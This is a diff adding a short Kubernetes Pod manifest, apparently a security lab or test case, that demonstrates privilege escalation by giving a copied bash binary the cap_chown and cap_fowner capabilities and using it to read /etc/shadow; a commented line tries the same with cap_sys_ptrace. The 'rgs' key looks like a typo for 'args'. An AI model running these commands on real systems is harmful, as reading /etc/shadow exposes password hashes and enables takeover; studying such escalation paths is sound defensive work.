@@ -1,0 +1,12 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pri-esc-via-cap-chown-cap-fowner
+spec:
+  containers:
+  - name: pri-esc-via-cap-chown-cap-fowner
+    image: angelrita/base-ubuntu:latest
+    #imagePullPolicy: Never
+    command: ["sh"]
+    #args: ['-c', 'cp /bin/bash /tmp/testbash; sudo setcap cap_sys_ptrace+ep /tmp/testbash; sudo -u test /tmp/testbash -c whoami; sleep infinity']
+    rgs: ['-c', "cp /bin/bash /tmp/testbash; setcap cap_chown,cap_fowner+ep /tmp/testbash; sudo -u test /tmp/testbash -c cat /etc/shadow; sleep infinity"]
